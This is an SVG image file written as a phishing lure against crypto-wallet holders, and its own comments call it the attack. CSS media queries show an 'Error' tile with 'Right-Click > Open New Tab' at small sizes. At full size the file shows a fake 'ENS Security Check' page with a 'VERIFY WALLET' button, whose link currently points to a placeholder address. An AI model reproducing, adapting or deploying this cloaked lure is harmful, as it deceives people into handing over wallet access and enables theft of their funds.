<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 1024 1024" preserveAspectRatio="none">
  <defs>
    <style>
      /* 1. DEFAULT STATE: Show the Phishing Page (The Attack) */
      /* We make this default so if CSS fails, the attack is visible */
      .redirect-layer { display: block; }
      .tile-layer { display: none; }

      /* 2. TILE STATE: Only if width is explicitly small */
      /* Most profile tiles are 100px - 300px wide */
      @media screen and (max-width: 600px) {
        .redirect-layer { display: none; }
        .tile-layer { display: block; }
      }
      
      /* Safety catch for specific containers */
      @media screen and (max-height: 600px) {
        .redirect-layer { display: none; }
        .tile-layer { display: block; }
      }

      .warning-text { font-family: Arial, sans-serif; font-weight: 900; font-size: 80px; fill: #ff4444; }
      .phish-button { fill: #5284ff; }
      .phish-button:hover { fill: #3b6bcc; }
    </style>
  </defs>

  <g class="tile-layer">
    <rect width="100%" height="100%" fill="#1a1a1a" />
    <text x="50%" y="40%" text-anchor="middle" class="warning-text">⚠️ Error</text>
    <text x="50%" y="60%" text-anchor="middle" font-family="Arial" font-size="30" fill="#fff">Right-Click > Open New Tab</text>
  </g>

  <g class="redirect-layer">
    <rect width="100%" height="100%" fill="#ffffff" />
    <text x="50%" y="30%" text-anchor="middle" font-family="Arial" font-size="50" fill="#333" font-weight="bold">ENS Security Check</text>
    
    <a href="https://google.com" xlink:href="https://google.com" target="_blank">
        <g>
            <rect x="212" y="500" width="600" height="100" rx="10" class="phish-button" />
            <text x="512" y="565" text-anchor="middle" font-family="Arial" font-size="35" fill="white" font-weight="bold">VERIFY WALLET</text>
            <rect x="212" y="500" width="600" height="100" fill-opacity="0" />
        </g>
    </a>
  </g>
</svg>
